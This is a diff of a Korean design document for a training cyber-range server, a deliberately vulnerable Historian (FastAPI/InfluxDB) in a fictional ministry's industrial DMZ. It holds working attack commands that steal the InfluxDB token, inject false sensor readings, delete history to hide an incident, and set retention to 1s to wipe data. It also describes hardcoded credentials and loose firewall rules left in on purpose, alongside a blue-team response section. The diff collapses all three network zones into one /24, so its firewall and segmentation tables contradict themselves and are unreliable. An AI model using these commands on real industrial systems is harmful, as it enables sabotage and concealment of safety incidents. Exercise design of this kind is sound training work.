@@ -4,10 +4,10 @@
 |------|------|
 | 자산 번호 | 12 |
 | 자산명 | Historian 서버 (OT History Data Server) |
-| IP 주소 | 192.168.200.10 |
+| IP 주소 | 192.168.92.212 |
 | 도메인 | historian.mois.local |
 | OS | Ubuntu 22.04 LTS |
-| 네트워크 구간 | Industrial DMZ (192.168.200.0/24) |
+| 네트워크 구간 | Industrial DMZ (192.168.92.0/24) |
 | 개방 포트 | 8086/tcp (InfluxDB), 8000/tcp (REST API) |
 | 작성일 | 2026-03-26 |
 | 버전 | 1.0 |
@@ -22,8 +22,8 @@ Historian 서버는 가상국가 발도리아(Valdoria) 행정안전부(MOIS)의
 
 이 서버는 INT 구간과 OT 구간 사이의 **데이터 브릿지(Data Bridge)** 역할을 수행하며, 다음과 같은 데이터 흐름을 지원한다:
 
-- **OT → Historian**: SCADA 시스템(192.168.201.10)이 센서 데이터를 InfluxDB에 직접 기록
-- **INT → Historian**: 내부 업무 시스템(192.168.100.12 등)이 REST API를 통해 이력 데이터 조회
+- **OT → Historian**: SCADA 시스템(192.168.92.213)이 센서 데이터를 InfluxDB에 직접 기록
+- **INT → Historian**: 내부 업무 시스템(192.168.92.204 등)이 REST API를 통해 이력 데이터 조회
 
 ### 1.2 훈련에서의 역할
 
@@ -39,18 +39,18 @@ Historian 서버는 가상국가 발도리아(Valdoria) 행정안전부(MOIS)의
 ### 1.3 공격 체인 내 위치 (STEP 3-1)
 
 ```
-[STEP 2] INT 구간 침투 완료 — 민원 처리 서버(192.168.100.12) RCE 확보
+[STEP 2] INT 구간 침투 완료 — 민원 처리 서버(192.168.92.206) RCE 확보
     │
     │  환경변수에서 Historian API 정보 탈취:
-    │  HISTORIAN_API=http://192.168.200.10:8000
+    │  HISTORIAN_API=http://192.168.92.212:8000
     │
     ▼
 ┌─────────────────────────────────────────────────────────────────────────────┐
-│ [★ STEP 3-1: Historian 서버 (Industrial DMZ, 192.168.200.10)]              │
+│ [★ STEP 3-1: Historian 서버 (Industrial DMZ, 192.168.92.212)]              │
 │                                                                             │
 │   ① API 엔드포인트 탐색 (인증 없음)                                         │
-│      curl http://192.168.200.10:8000/api/tags                              │
-│      curl http://192.168.200.10:8000/api/config   ← InfluxDB 토큰 노출     │
+│      curl http://192.168.92.212:8000/api/tags                              │
+│      curl http://192.168.92.212:8000/api/config   ← InfluxDB 토큰 노출     │
 │                                                                             │
 │   ② OT 이력 데이터 공격                                                     │
 │      ├── GET  /api/query → 센서 데이터 전체 조회 (정찰)                      │
@@ -58,10 +58,10 @@ Historian 서버는 가상국가 발도리아(Valdoria) 행정안전부(MOIS)의
 │      └── DELETE /api/data → 이상 징후 이력 삭제 (은폐)                       │
 │                                                                             │
 │   ③ InfluxDB 토큰으로 직접 접근                                             │
-│      influx query --host http://192.168.200.10:8086                        │
+│      influx query --host http://192.168.92.212:8086                        │
 │               --token historian-dev-token-2024                              │
 │                                                                             │
-│   ④ OT 네트워크 정보 수집 → SCADA(192.168.201.10) 피벗 준비                 │
+│   ④ OT 네트워크 정보 수집 → SCADA(192.168.92.213) 피벗 준비                 │
 │                                                                             │
 │   ★ 데이터 무결성 침해 + OT 피벗 거점 확보 ★                                 │
 └─────────────────────────────────────────────────────────────────────────────┘
@@ -103,11 +103,11 @@ pydantic==2.5.0
 ### 3.1 시스템 구성도
 
 ```
- ┌──── INT (192.168.100.0/24) ────────────────────────────────────────────┐
+ ┌──── INT (192.168.92.0/24) ────────────────────────────────────────────┐
  │                                                                         │
  │  ┌────────────────────┐   ┌────────────────────┐                        │
  │  │ 민원 처리 서버       │   │ 내부 업무 포털      │                        │
- │  │ (192.168.100.12)   │   │ (192.168.100.10)   │                        │
+ │  │ (192.168.92.206)   │   │ (192.168.92.204)   │                        │
  │  │                    │   │                    │                        │
  │  └────────┬───────────┘   └────────┬───────────┘                        │
  │           │                        │                                    │
@@ -117,11 +117,11 @@ pydantic==2.5.0
     ═════════╪════════════════════════╪══════  OPNSense-4 (INT→Industrial DMZ)
              │   허용: 단방향, 특정 포트  │        역방향 차단
              │                        │
- ┌──── Industrial DMZ (192.168.200.0/24) ─────────────────────────────────┐
+ ┌──── Industrial DMZ (192.168.92.0/24) ─────────────────────────────────┐
  │           │                        │                                    │
  │           ▼                        ▼                                    │
  │  ┌─────────────────────────────────────────────────────────────────┐    │
- │  │              Historian 서버 (192.168.200.10)                     │    │
+ │  │              Historian 서버 (192.168.92.212)                     │    │
  │  │              Ubuntu 22.04 LTS                                   │    │
  │  │                                                                 │    │
  │  │  ┌──────────────────────┐     ┌──────────────────────────────┐  │    │
@@ -147,11 +147,11 @@ pydantic==2.5.0
     ══════════════════════════════════════════╪══════  OPNSense-5 (OT→Industrial DMZ)
                                               │   허용: SCADA→Historian 쓰기만
                                               │
- ┌──── OT (192.168.201.0/24) ─────────────────┼───────────────────────────┐
+ ┌──── OT (192.168.92.0/24) ─────────────────┼───────────────────────────┐
  │                                            │                            │
  │  ┌────────────────────┐                    │                            │
  │  │ SCADA 시스템        │────────────────────┘                            │
- │  │ (192.168.201.10)   │   Telegraf/직접 쓰기 → InfluxDB                 │
+ │  │ (192.168.92.213)   │   Telegraf/직접 쓰기 → InfluxDB                 │
  │  │                    │                                                 │
  │  └────────────────────┘                                                 │
  │                                                                         │
@@ -162,8 +162,8 @@ pydantic==2.5.0
 
 | 방향 | 출발지 | 목적지 | 포트 | 프로토콜 | 용도 |
 |------|--------|--------|------|---------|------|
-| OT → Industrial DMZ | SCADA (192.168.201.10) | Historian InfluxDB | 8086 | HTTP (InfluxDB Line Protocol) | 센서 데이터 기록 |
-| INT → Industrial DMZ | 민원 처리 서버 (192.168.100.12) | Historian REST API | 8000 | HTTP (JSON) | OT 데이터 조회 |
+| OT → Industrial DMZ | SCADA (192.168.92.213) | Historian InfluxDB | 8086 | HTTP (InfluxDB Line Protocol) | 센서 데이터 기록 |
+| INT → Industrial DMZ | 민원 처리 서버 (192.168.92.206) | Historian REST API | 8000 | HTTP (JSON) | OT 데이터 조회 |
 | Industrial DMZ 내부 | FastAPI (:8000) | InfluxDB (:8086) | 8086 | HTTP (Flux Query) | API→DB 쿼리 |
 | **차단** | Industrial DMZ | INT | * | * | **역방향 트래픽 차단** |
 | **차단** | Industrial DMZ | OT | * | * | **역방향 트래픽 차단** |
@@ -176,7 +176,7 @@ pydantic==2.5.0
 
 | 인터페이스 | IP 주소 | 서브넷 | 게이트웨이 | 용도 |
 |-----------|---------|--------|-----------|------|
-| ens160 | 192.168.200.10 | /24 | 192.168.200.1 | Industrial DMZ 서비스 |
+| ens160 | 192.168.92.212 | /24 | 192.168.92.1 | Industrial DMZ 서비스 |
 
 ### 4.2 리스닝 포트
 
@@ -189,8 +189,8 @@ pydantic==2.5.0
 
 ```bash
 # 인바운드
-ufw allow from 192.168.100.0/24 to any port 8000 proto tcp    # INT → REST API
-ufw allow from 192.168.201.10/32 to any port 8086 proto tcp   # SCADA → InfluxDB 쓰기
+ufw allow from 192.168.92.0/24 to any port 8000 proto tcp    # INT → REST API
+ufw allow from 192.168.92.213/32 to any port 8086 proto tcp   # SCADA → InfluxDB 쓰기
 ufw allow from 127.0.0.1 to any port 8086 proto tcp           # 로컬 API → InfluxDB
 
 # ★ 취약점: INT 서브넷 전체에서 API 접근 가능 (특정 호스트 제한 없음) ★
@@ -204,18 +204,18 @@ ufw default allow outgoing
 
 | 순번 | 방향 | 출발지 | 목적지 | 포트 | 동작 | 설명 |
 |------|------|--------|--------|------|------|------|
-| 1 | INT → Industrial DMZ | 192.168.100.12 | 192.168.200.10 | 8000 | ALLOW | 민원 처리 서버 → Historian API |
-| 2 | INT → Industrial DMZ | 192.168.100.0/24 | 192.168.200.10 | 8000 | ALLOW | INT 전체 → Historian API |
-| 3 | Industrial DMZ → INT | 192.168.200.0/24 | 192.168.100.0/24 | * | **BLOCK** | 역방향 차단 |
+| 1 | INT → Industrial DMZ | 192.168.92.206 | 192.168.92.212 | 8000 | ALLOW | 민원 처리 서버 → Historian API |
+| 2 | INT → Industrial DMZ | 192.168.92.0/24 | 192.168.92.212 | 8000 | ALLOW | INT 전체 → Historian API |
+| 3 | Industrial DMZ → INT | 192.168.92.0/24 | 192.168.92.0/24 | * | **BLOCK** | 역방향 차단 |
 
-> **보안 문제:** 규칙 2에서 INT 전체 서브넷에 대해 Historian API 접근이 허용되어 있다. 정상적이라면 민원 처리 서버(192.168.100.12)만 허용해야 하지만, 의도적으로 넓게 열어두어 횡이동한 공격자가 접근할 수 있도록 설계했다.
+> **보안 문제:** 규칙 2에서 INT 전체 서브넷에 대해 Historian API 접근이 허용되어 있다. 정상적이라면 민원 처리 서버(192.168.92.206)만 허용해야 하지만, 의도적으로 넓게 열어두어 횡이동한 공격자가 접근할 수 있도록 설계했다.
 
 ### 4.5 OPNSense-5 규칙 (OT ↔ Industrial DMZ)
 
 | 순번 | 방향 | 출발지 | 목적지 | 포트 | 동작 | 설명 |
 |------|------|--------|--------|------|------|------|
-| 1 | OT → Industrial DMZ | 192.168.201.10 | 192.168.200.10 | 8086 | ALLOW | SCADA → InfluxDB 쓰기 |
-| 2 | Industrial DMZ → OT | 192.168.200.10 | 192.168.201.10 | * | **BLOCK** | 역방향 차단 |
+| 1 | OT → Industrial DMZ | 192.168.92.213 | 192.168.92.212 | 8086 | ALLOW | SCADA → InfluxDB 쓰기 |
+| 2 | Industrial DMZ → OT | 192.168.92.212 | 192.168.92.213 | * | **BLOCK** | 역방향 차단 |
 
 ---
 
@@ -410,12 +410,12 @@ Content-Type: application/json
 **공격 예시 — 허위 데이터 삽입:**
 ```bash
 # 정상 범위(20-30°C)를 초과하는 위험 값 삽입
-curl -X POST http://192.168.200.10:8000/api/write \
+curl -X POST http://192.168.92.212:8000/api/write \
   -H "Content-Type: application/json" \
   -d '{"tag":"temperature","value":999.9,"timestamp":"2026-03-26T10:00:00Z"}'
 
 # 과거 시점의 데이터 위조 (타임스탬프 조작)
-curl -X POST http://192.168.200.10:8000/api/write \
+curl -X POST http://192.168.92.212:8000/api/write \
   -H "Content-Type: application/json" \
   -d '{"tag":"pressure","value":100.0,"timestamp":"2026-03-25T00:00:00Z"}'
 ```
@@ -449,11 +449,11 @@ Host: historian.mois.local:8000
 **공격 예시 — 사고 은폐를 위한 이력 삭제:**
 ```bash
 # 24시간 분량의 온도 이력 삭제 (이상 징후 은폐)
-curl -X DELETE "http://192.168.200.10:8000/api/data?tag=temperature&from=2026-03-25T00:00:00Z&to=2026-03-26T00:00:00Z"
+curl -X DELETE "http://192.168.92.212:8000/api/data?tag=temperature&from=2026-03-25T00:00:00Z&to=2026-03-26T00:00:00Z"
 
 # 전체 태그 데이터 삭제 (완전 인멸)
 for tag in temperature pressure flow_rate power; do
-  curl -X DELETE "http://192.168.200.10:8000/api/data?tag=$tag&from=2020-01-01T00:00:00Z&to=2030-01-01T00:00:00Z"
+  curl -X DELETE "http://192.168.92.212:8000/api/data?tag=$tag&from=2020-01-01T00:00:00Z&to=2030-01-01T00:00:00Z"
 done
 ```
 
@@ -468,12 +468,12 @@ Host: historian.mois.local:8000
 **응답 (200 OK):**
 ```json
 {
-    "influxdb_url": "http://192.168.200.10:8086",
+    "influxdb_url": "http://192.168.92.212:8086",
     "influxdb_org": "ot-org",
     "influxdb_bucket": "ot_data",
     "influxdb_token": "historian-dev-token-2024",
     "api_version": "1.0.0",
-    "scada_endpoint": "192.168.201.10"
+    "scada_endpoint": "192.168.92.213"
 }
 ```
 
@@ -518,14 +518,14 @@ Host: historian.mois.local:8000
 # /opt/historian/app/.env
 # ★ 취약점: 하드코딩된 자격증명 ★
 
-HISTORIAN_API=http://192.168.200.10:8000
-INFLUXDB_URL=http://192.168.200.10:8086
+HISTORIAN_API=http://192.168.92.212:8000
+INFLUXDB_URL=http://192.168.92.212:8086
 INFLUXDB_TOKEN=historian-dev-token-2024
 INFLUXDB_ORG=ot-org
 INFLUXDB_BUCKET=ot_data
 
 # SCADA 연동 정보
-SCADA_HOST=192.168.201.10
+SCADA_HOST=192.168.92.213
 SCADA_PORT=502
 ```
 
@@ -591,11 +591,11 @@ async def get_config():
 **공격자 활용:**
 ```bash
 # 1. 토큰 탈취
-TOKEN=$(curl -s http://192.168.200.10:8000/api/config | jq -r '.influxdb_token')
+TOKEN=$(curl -s http://192.168.92.212:8000/api/config | jq -r '.influxdb_token')
 
 # 2. InfluxDB에 직접 접근 (API 우회)
 curl -H "Authorization: Token $TOKEN" \
-  "http://192.168.200.10:8086/api/v2/query?orgID=ot-org" \
+  "http://192.168.92.212:8086/api/v2/query?orgID=ot-org" \
   --data-urlencode 'q=from(bucket:"ot_data") |> range(start: -24h)'
 ```
 
@@ -684,9 +684,9 @@ class WriteRequest(BaseModel):
 ```bash
 # 탈취한 토큰으로 InfluxDB CLI 접근
 influx bucket update \
-  --host http://192.168.200.10:8086 \
+  --host http://192.168.92.212:8086 \
   --token historian-dev-token-2024 \
-  --id $(influx bucket list --host http://192.168.200.10:8086 \
+  --id $(influx bucket list --host http://192.168.92.212:8086 \
          --token historian-dev-token-2024 --org ot-org \
          --name ot_data --json | jq -r '.[0].id') \
   --retention 1s
@@ -719,11 +719,11 @@ from dotenv import load_dotenv
 # ─── 환경변수 로드 ───────────────────────────────────────────────────
 load_dotenv()
 
-INFLUXDB_URL = os.getenv("INFLUXDB_URL", "http://192.168.200.10:8086")
+INFLUXDB_URL = os.getenv("INFLUXDB_URL", "http://192.168.92.212:8086")
 INFLUXDB_TOKEN = os.getenv("INFLUXDB_TOKEN", "historian-dev-token-2024")  # ★ VULN-2: 하드코딩 토큰
 INFLUXDB_ORG = os.getenv("INFLUXDB_ORG", "ot-org")
 INFLUXDB_BUCKET = os.getenv("INFLUXDB_BUCKET", "ot_data")
-SCADA_HOST = os.getenv("SCADA_HOST", "192.168.201.10")
+SCADA_HOST = os.getenv("SCADA_HOST", "192.168.92.213")
 
 # ─── 로깅 설정 ───────────────────────────────────────────────────────
 logging.basicConfig(
@@ -1037,7 +1037,7 @@ from(bucket: "ot_data")
 ### 9.5 블루팀 대응 절차
 
 1. **즉시 대응:**
-   - OPNSense-4 규칙 강화: INT→Historian 접근을 192.168.100.12만 허용
+   - OPNSense-4 규칙 강화: INT→Historian 접근을 192.168.92.206만 허용
    - `/api/config`, `/api/write`, `/api/data(DELETE)` 엔드포인트 비활성화
    - InfluxDB 토큰 로테이션
 
@@ -1061,7 +1061,7 @@ from(bucket: "ot_data")
 #!/bin/bash
 # ═══════════════════════════════════════════════════════════════════════
 # Historian 서버 설치 스크립트
-# 대상: Ubuntu 22.04 LTS (192.168.200.10)
+# 대상: Ubuntu 22.04 LTS (192.168.92.212)
 #
 # ★ 사이버 훈련용 — 의도적 취약점 포함 ★
 # ═══════════════════════════════════════════════════════════════════════
@@ -1109,12 +1109,12 @@ pip install fastapi==0.104.1 uvicorn[standard]==0.24.0 influxdb-client==1.38.0 p
 
 # .env 파일 생성
 cat > /opt/historian/app/.env << 'ENVEOF'
-HISTORIAN_API=http://192.168.200.10:8000
-INFLUXDB_URL=http://192.168.200.10:8086
+HISTORIAN_API=http://192.168.92.212:8000
+INFLUXDB_URL=http://192.168.92.212:8086
 INFLUXDB_TOKEN=historian-dev-token-2024
 INFLUXDB_ORG=ot-org
 INFLUXDB_BUCKET=ot_data
-SCADA_HOST=192.168.201.10
+SCADA_HOST=192.168.92.213
 SCADA_PORT=502
 ENVEOF
 
@@ -1147,8 +1147,8 @@ echo "=== [7/7] 방화벽 (ufw) 설정 ==="
 ufw --force reset
 ufw default deny incoming
 ufw default allow outgoing
-ufw allow from 192.168.100.0/24 to any port 8000 proto tcp   # INT → API
-ufw allow from 192.168.201.10/32 to any port 8086 proto tcp  # SCADA → InfluxDB
+ufw allow from 192.168.92.0/24 to any port 8000 proto tcp   # INT → API
+ufw allow from 192.168.92.213/32 to any port 8086 proto tcp  # SCADA → InfluxDB
 ufw allow from 127.0.0.1 to any port 8086 proto tcp          # 로컬 API → InfluxDB
 ufw --force enable
 
@@ -1156,8 +1156,8 @@ echo "=== 시드 데이터 생성 ==="
 python3 /opt/historian/scripts/seed_data.py
 
 echo "=== 설치 완료 ==="
-echo "  - InfluxDB: http://192.168.200.10:8086"
-echo "  - REST API: http://192.168.200.10:8000"
+echo "  - InfluxDB: http://192.168.92.212:8086"
+echo "  - REST API: http://192.168.92.212:8000"
 echo "  - 토큰: historian-dev-token-2024"
 ```
 
@@ -1222,7 +1222,7 @@ from influxdb_client import InfluxDBClient, Point
 from influxdb_client.client.write_api import SYNCHRONOUS
 
 # ─── InfluxDB 접속 설정 ──────────────────────────────────────────────
-INFLUXDB_URL = "http://192.168.200.10:8086"
+INFLUXDB_URL = "http://192.168.92.212:8086"
 INFLUXDB_TOKEN = "historian-dev-token-2024"
 INFLUXDB_ORG = "ot-org"
 INFLUXDB_BUCKET = "ot_data"
@@ -1376,7 +1376,7 @@ if __name__ == "__main__":
 
 ```bash
 # 태그별 레코드 수 확인
-curl -s "http://192.168.200.10:8000/api/query?tag=temperature&from=-24h&limit=5" | jq
+curl -s "http://192.168.92.212:8000/api/query?tag=temperature&from=-24h&limit=5" | jq
 
 # 예상 응답:
 # {
